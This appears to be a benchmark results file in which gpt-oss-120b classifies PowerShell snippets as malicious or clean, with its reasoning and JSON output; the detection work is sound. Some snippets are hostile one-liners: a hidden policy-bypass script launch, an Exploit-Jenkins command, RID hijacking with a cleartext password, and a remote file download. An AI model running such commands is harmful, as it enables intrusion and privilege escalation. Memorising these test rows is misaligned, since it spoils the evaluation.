+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0373,Malicious,"We need to produce JSON per schema. The content is a command line invoking powershell.exe with ExecutionPolicy Bypass, NoLogo, NonInteractive, WindowStyle Hidden, NoProfile, -File malicious_script.ps1. This is suspicious: bypass execution policy, hidden window, runs a script named malicious_script.ps1. So we classify as Malicious (definitely offensive). Provide summary, evidence (code segment: the command line). Tag: DEFENSE_EVASION (bypass), EXECUTION, OBFUSCATION? Not exactly. Also PERSISTENCE? Not here. So tag maybe ""DEFENSE_EVASION"" or ""EXECUTION"". Provide explanation.
+
+We need fields: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Tag could be ""EXECUTION"" or ""DEFENSE_EVASION"". Choose ""EXECUTION"". Provide is_malicious ""Malicious"". Provide explain: The command uses ExecutionPolicy Bypass and hidden window to run a script, typical of malicious execution.
+
+Let's craft JSON. Ensure required fields: summary, is_malicious, explain. evidence optional but we include.
+
+Make sure code string is exactly the command line. Provide explanation.
+
+Return only JSON.","{
+  ""summary"": ""The command launches PowerShell with ExecutionPolicy Bypass and a hidden window to run a script named malicious_script.ps1."",
+  ""evidence"": [
+    {
+      ""code"": ""powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File malicious_script.ps1"",
+      ""code_explain"": ""Uses '-ExecutionPolicy Bypass' to ignore the system's PowerShell execution policy, '-WindowStyle Hidden' to conceal the console, and '-NoProfile' to avoid loading user profiles. These flags are commonly employed by attackers to execute malicious payloads stealthily."",
+      ""tag"": ""DEFENSE_EVASION""
+    },
+    {
+      ""code"": ""powershell.exe -ExecutionPolicy Bypass -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File malicious_script.ps1"",
+      ""code_explain"": ""The '-File malicious_script.ps1' argument directs PowerShell to execute an external script, which could contain further malicious behavior such as downloading payloads, credential theft, or persistence mechanisms."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The command deliberately disables PowerShell's execution restrictions and hides its window, a typical technique for running malicious scripts without user awareness. The presence of a script named 'malicious_script.ps1' further indicates offensive intent."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""EXECUTION""
+}",,,"# Natural language intent:
+# Run a PowerShell script with specified options and hide the window.
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File malicious_script.ps1
+",1637
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0421,Clean,"We need to produce JSON per schema. Analyze script: It clears $error, queries WMI class MSAcpi_ThermalZoneTemperature, which may be used to detect virtualization? Not typical malicious. It's just checking virtualization environment and printing message. No malicious behavior. No remote execution, no persistence, no credential access, no download, no obfuscation. So classification: Clean. Provide summary, evidence maybe none. But need evidence array possibly empty. Provide explain: script only performs a simple WMI query and prints message; no malicious behavior. Tag maybe ""DISCOVERY"" but since clean, tag maybe null or omitted. Schema requires tag property optional? It is defined but not required. We can include tag as ""DISCOVERY"" but is_malicious Clean. Provide evidence empty array.
+
+Return JSON.","{
+  ""summary"": ""The script clears the error variable, queries a WMI class for thermal zone temperature, and prints a message if any error occurs, effectively checking for a virtualization environment."",
+  ""evidence"": [],
+  ""explain"": ""The code only performs a local WMI query and conditional output without any remote communication, persistence mechanisms, credential access, or obfuscation. It does not exhibit malicious or offensive behavior."",
+  ""is_malicious"": ""Clean"",
+  ""tag"": ""DISCOVERY""
+}",,,"# Natural language intent:
+# Check for virtualization environment and print a message if detected using PowerShell.
+
+$error.clear() ; Get-WmiObject -Query ""SELECT * FROM MSAcpi_ThermalZoneTemperature"" -ErrorAction SilentlyContinue ; if($error) {echo ""Virtualization Environment detected""}
+",1356
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0416,Clean,"We need to analyze the provided PowerShell content: ""Start-WebcamRecorder"". That's a command presumably defined elsewhere; maybe a function that records webcam. No code provided. So we have only a single command invocation. No evidence of malicious behavior. Could be benign (record webcam). Could be used for surveillance, but without more context it's ambiguous. According to guidelines, we need to produce structured JSON with summary, evidence (if any), explain, is_malicious, tag.
+
+Since there is no code showing remote download, credential access, etc., we classify as ""Notreally"" or ""Clean""? The command could be used for legitimate purposes (e.g., user wants to record). There's no indication of malicious intent. So classification: Clean or Notreally. The categories: Clean = harmless script. Since it's just a command, I'd say Clean.
+
+Provide summary: ""Invokes the Start-WebcamRecorder cmdlet/function to capture video from the local webcam.""
+
+Evidence: none (empty array). Explain: No malicious indicators.
+
+Tag: maybe ""COLLECTION"" if we consider webcam capture is collection of video, but classification is Clean. The tag field is required only if malicious? The schema says tag is optional? It is defined but not required. We can include null or omit. Provide maybe ""COLLECTION"" as general category but still Clean. The spec: ""tag"" description: ""Tag classifying the general category of the script if it is malicious"". Since not malicious, we can omit or set null. Probably omit.
+
+Return JSON.","{
+  ""summary"": ""The script simply calls the Start-WebcamRecorder command, which (if defined) would begin capturing video from the local webcam."",
+  ""evidence"": [],
+  ""explain"": ""The provided content contains only a single cmdlet invocation with no evidence of remote communication, credential theft, persistence, obfuscation, or other typical malicious behaviors. Without additional code, there are no observable indicators of malicious or offensive activity."",
+  ""is_malicious"": ""Clean""
+}",,,"# Natural language intent:
+# Start recording from the webcam using PowerShell.
+
+Start-WebcamRecorder
+",1449
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0437,Clean,"We need to analyze the provided PowerShell content: ""{{#1758704250191.check_data#}}"". That's a placeholder, not actual PowerShell code. The user says natural language intent: reference a specific file path in the Atomic Red Team framework. The content is just a placeholder token. No PowerShell commands. So we should classify as Clean or Not really. There's no code. So summary: The content appears to be a placeholder token, no executable PowerShell. No malicious indicators. So is_malicious = Clean. Tag maybe ""NONE"". evidence empty.
+
+Return JSON per schema.","{
+  ""summary"": ""The provided content is a placeholder token (\""{{#1758704250191.check_data#}}\"") and does not contain any executable PowerShell code."",
+  ""evidence"": [],
+  ""explain"": ""There are no PowerShell commands, functions, or obfuscation techniques present. Consequently, no indicators of malicious behavior such as remote execution, credential access, persistence, or evasion can be observed."",
+  ""is_malicious"": ""Clean"",
+  ""tag"": ""NONE""
+}",,,"# Natural language intent:
+# Reference a specific file path in the Atomic Red Team framework.
+
+PathToAtomicsFolder\T1027.006\bin\T1027_006_tec_remote.html
+",1290
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0432,Clean,"We need to analyze the provided PowerShell script:
+
+```
+# Natural language intent:
+# Update the LastAccessTime of files in a specified path using PowerShell.
+
+Get-ChildItem ${filePath} | % { $_.LastAccessTime = ""${targetTime}"" }
+```
+
+We need to produce JSON with summary, evidence, explain, is_malicious, tag.
+
+We need to check for malicious indicators. This script enumerates files in a path and sets LastAccessTime to a target time. This is a benign operation, could be used for legitimate purposes (e.g., forensic timestamp manipulation). Not inherently malicious. Could be used for anti-forensics, but without context it's just a timestamp modification. It's not remote execution, no network, no credential access, no persistence, no privilege escalation, no obfuscation. So classification: Likely? Or Clean? The script could be used for malicious anti-forensics, but the code itself is benign. According to guidelines, if no malicious indicators, classify as Clean. Provide evidence: none? But evidence array can be empty. Provide summary: ""The script updates the LastAccessTime attribute of all files in a given directory to a specified timestamp."" Tag: maybe ""DEFENSE_EVASION"" if used for anti-forensics, but not necessarily. Since we need tag field only if malicious. The schema includes ""tag"" property but not required. We can omit or set null? The schema expects string if present. We can omit if not malicious. Provide is_malicious: ""Clean"". Explain: It's a simple file attribute modification, no malicious behavior.
+
+Let's construct JSON accordingly.","{
+  ""summary"": ""The script enumerates all files in a given directory and sets each file's LastAccessTime to a specified timestamp."",
+  ""evidence"": [],
+  ""explain"": ""The code only performs a local file attribute modification using Get-ChildItem and a simple assignment. It does not contain remote execution, credential harvesting, persistence mechanisms, privilege escalation, obfuscation, or any other typical malicious behaviors. While changing timestamps can be used for anti‑forensic purposes, the script itself is benign without additional context."",
+  ""is_malicious"": ""Clean""
+}",,,"# Natural language intent:
+# Update the LastAccessTime of files in a specified path using PowerShell.
+
+Get-ChildItem ${filePath} | % { $_.LastAccessTime = ""${targetTime}"" }
+",1516
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0436,Malicious,"We need to analyze the provided content. It's a PowerShell command: ""Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'whoami'"". This appears to be invoking a function or script named Exploit-Jenkins with parameters to target a Jenkins server and run a command. This is clearly malicious/offensive: it's an exploit script for Jenkins. The content is a command, not full script, but indicates remote command execution, exploitation, possibly privilege escalation. So classification: Malicious. Provide summary, evidence, explain, tag.
+
+We need to output JSON with required fields: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag.
+
+Evidence: the command itself uses ""Exploit-Jenkins"" which is likely a function that exploits Jenkins. The parameters include -Cmd 'whoami' which is remote command execution. Tag: REMOTE_COMMAND_EXECUTION, maybe also EXPLOIT (but not in list). Use general_titles list includes ""REMOTE_COMMAND_EXECUTION"". Also ""EXECUTION"". Could tag as ""REMOTE_COMMAND_EXECUTION"". Provide code segment: the whole command.
+
+Explain: The command attempts to exploit Jenkins server at 127.0.0.1:8080 to execute arbitrary command, which is malicious.
+
+Tag: ""REMOTE_COMMAND_EXECUTION"" or ""EXECUTION"". Choose one: ""REMOTE_COMMAND_EXECUTION"".
+
+Now produce JSON. Ensure required fields: summary, is_malicious, explain. evidence optional but include.
+
+Let's craft.","{
+  ""summary"": ""The command invokes a Jenkins exploitation function to run an arbitrary command on a target Jenkins server."",
+  ""evidence"": [
+    {
+      ""code"": ""Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'whoami'"",
+      ""code_explain"": ""Calls a likely custom function/module named `Exploit-Jenkins` with parameters specifying a remote host, port, and a command (`whoami`). This pattern is typical of exploit scripts that achieve remote command execution on a vulnerable service (Jenkins). The inclusion of a user‑controlled command argument indicates the ability to execute arbitrary code on the target."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    }
+  ],
+  ""explain"": ""The content is an explicit attempt to exploit a Jenkins instance and execute an arbitrary command, which is a classic offensive behavior. No defensive or benign context is present, so it is classified as malicious."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""REMOTE_COMMAND_EXECUTION""
+}",,,"# Natural language intent:
+# Exploit Jenkins with a specified command and target using PowerShell.
+
+Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'whoami'
+",1604
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0440,Malicious,"We need to analyze the provided PowerShell content. The content is a command: `Invoke-RIDHijacking -User Paul -RID 1002 -Password Password6 -Enable`. This appears to be invoking a function or cmdlet named Invoke-RIDHijacking with parameters. This is likely a custom script for RID hijacking (manipulating relative identifier in SAM to elevate privileges). This is definitely malicious behavior: privilege escalation. So classification: Malicious. Provide summary, evidence, explain, tag.
+
+We need to output JSON with required fields: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Tag could be ""PRIVILEGE_ESCALATION"". Provide evidence: the command itself. Provide explanation: calling a function that performs RID hijacking, which is a known privilege escalation technique. Also includes password in clear text, which is credential usage. So maybe also CREDENTIAL_ACCESS. But we need one tag per evidence? The schema says each evidence item has a tag string. Could include multiple evidence items.
+
+We'll produce evidence array with two items: one for privilege escalation, one for credential exposure. Provide code snippet.
+
+Now produce JSON.","{
+  ""summary"": ""The script invokes a custom cmdlet/function named Invoke‑RIDHijacking with explicit user, RID, password and enable flags, indicating an attempt to perform RID hijacking for privilege escalation."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-RIDHijacking -User Paul -RID 1002 -Password Password6 -Enable"",
+      ""code_explain"": ""Calls a function that is known to manipulate the Relative Identifier (RID) of a local account in the SAM database. Changing a low‑privilege account's RID to that of an administrator (e.g., 500 or 512) grants the attacker SYSTEM‑level rights. The presence of the –Enable switch suggests the script will activate the hijacked account immediately."",
+      ""tag"": ""PRIVILEGE_ESCALATION""
+    },
+    {
+      ""code"": ""Invoke-RIDHijacking -User Paul -RID 1002 -Password Password6 -Enable"",
+      ""code_explain"": ""The clear‑text password supplied via the –Password parameter reveals credential handling. Supplying credentials directly in a script is a common indicator of credential access or misuse, especially when combined with a privilege‑escalation technique."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    }
+  ],
+  ""explain"": ""The command is designed to hijack a user’s RID and enable the account, a classic Windows privilege‑escalation technique. Supplying a password in clear text further confirms malicious intent to gain elevated rights using stolen credentials."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""PRIVILEGE_ESCALATION""
+}",,,"# Natural language intent:
+# Invoke RID Hijacking with specific user, RID, password, and enable parameters using PowerShell.
+
+Invoke-RIDHijacking -User Paul -RID 1002 -Password Password6 -Enable
+",1648
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0445,Clean,"We need to analyze the provided PowerShell content:
+
+```
+Invoke-Expression -Command {& {Get-Process | Out-File c:\temp\process.txt}}
+```
+
+We need to produce JSON with required fields.
+
+First, summarize: script runs Get-Process and writes to file c:\temp\process.txt. It's a simple local enumeration, not necessarily malicious. Could be used for legitimate admin tasks. No remote, no credential, no persistence, no obfuscation. It's just execution of Get-Process and writing to file. Could be considered discovery (process enumeration) but not necessarily malicious. Classification: likely ""Notreally"" or ""Clean"". According to guidelines, if script exhibits at least one malicious indicator, classify as Malicious or Likely. Here, it's just process enumeration, which is a discovery behavior. That could be suspicious if used by attacker, but on its own it's benign. The instruction says ""Not enough context"" refers to missing technical detail, never to context asserted. So we have to decide based on observable behavior. Process enumeration is a discovery technique, but not inherently malicious. Could be ""Notreally"" (ambiguous) or ""Clean"". I'd lean ""Notreally"" because it's ambiguous: could be benign admin script. The tag could be ""DISCOVERY"". Provide evidence: the Get-Process pipeline.
+
+Let's produce evidence array with one item:
+
+code: ""Get-Process | Out-File c:\temp\process.txt""
+code_explain: ""Uses Get-Process to enumerate all running processes on the local system and writes the output to a file. Process enumeration is a common discovery technique used by attackers to map the environment, but the command itself is benign and does not perform any privileged actions, remote calls, or persistence.""
+tag: ""DISCOVERY""
+
+Now summary: ""The script enumerates all running processes on the local machine and saves the list to c:\temp\process.txt.""
+
+Explain: ""The content only performs local process enumeration and writes to a file; there is no evidence of malicious intent such as remote communication, credential theft, persistence, or obfuscation. While process discovery can be part of reconnaissance, the script alone is benign.""
+
+is_malicious: ""Notreally"" (or ""Clean""?). I'd choose ""Notreally"" because ambiguous.
+
+tag: ""DISCOVERY""
+
+Now produce JSON. Ensure required fields: summary, is_malicious, explain. evidence optional but we include.
+
+Let's craft final answer.","{
+  ""summary"": ""The script enumerates all running processes on the local machine and writes the output to C:\\temp\\process.txt."",
+  ""evidence"": [
+    {
+      ""code"": ""Get-Process | Out-File c:\\temp\\process.txt"",
+      ""code_explain"": ""Uses Get-Process to list every process currently running on the host and redirects the textual output to a file. This is a standard PowerShell discovery technique; it does not involve remote calls, credential access, persistence, or any form of code obfuscation."",
+      ""tag"": ""DISCOVERY""
+    }
+  ],
+  ""explain"": ""The content only performs local process enumeration and file output. No malicious behaviors such as remote execution, credential theft, persistence mechanisms, or evasion techniques are present. While process discovery can be used by attackers, the script itself is benign and lacks any offensive intent."",
+  ""is_malicious"": ""Notreally"",
+  ""tag"": ""DISCOVERY""
+}",,,"# Natural language intent:
+# Invoke a script block that retrieves process information and writes it to a file using PowerShell.
+
+Invoke-Expression -Command {& {Get-Process | Out-File c:\temp\process.txt}}
+",1772
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0454,Malicious,"We need to produce JSON per schema. The script is simple: uses WebClient to download a file. This is a downloader behavior, potentially malicious but could be benign. The content: (New-Object System.Net.WebClient).DownloadFile(""${RemoteFile}"", ""${destinationPath}"").
+
+We need to summarize, evidence, explain, classification. Since it's just a downloader, could be malicious if remote file unknown. But without further context, it's suspicious. According to guidelines, if at least one malicious indicator like downloader, we classify as Malicious or Likely. Since it's just a downloader, could be used for benign purposes. I'd classify as Likely (suspicious but not enough context). Provide evidence: code segment, explanation, tag: DOWNLOADER or EXECUTION. Provide overall tag maybe ""DOWNLOADER"". Provide summary: script downloads a file from remote URL to local path.
+
+Explain: The use of WebClient DownloadFile is typical for fetching payloads; could be used for malicious payloads. No further obfuscation.
+
+Return JSON with required fields: summary, is_malicious, explain, evidence array, tag optional? The schema includes tag property but not required. Provide tag maybe ""DOWNLOADER"". Provide evidence array with one object.
+
+Let's craft.
+
+","{
+  ""summary"": ""The script creates a System.Net.WebClient object and uses its DownloadFile method to retrieve a file from a remote URL and save it to a local path."",
+  ""evidence"": [
+    {
+      ""code"": ""(New-Object System.Net.WebClient).DownloadFile(\""${RemoteFile}\"", \""${destinationPath}\"")"",
+      ""code_explain"": ""Instantiates a .NET WebClient and calls DownloadFile, which fetches arbitrary data from a remote server and writes it to disk. This pattern is commonly used by malware to download additional payloads (downloader behavior) and is considered suspicious when the source URL is uncontrolled."",
+      ""tag"": ""DOWNLOADER""
+    }
+  ],
+  ""explain"": ""The script performs a direct file download from a remote location without any validation or integrity checks. While the technique is legitimate for legitimate administration, it is a classic indicator of downloader behavior used by attackers to fetch malicious payloads, making the script suspicious."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Download a file from a remote server using PowerShell.
+
+(New-Object System.Net.WebClient).DownloadFile(""${RemoteFile}"", ""${destinationPath}"")
+",1537
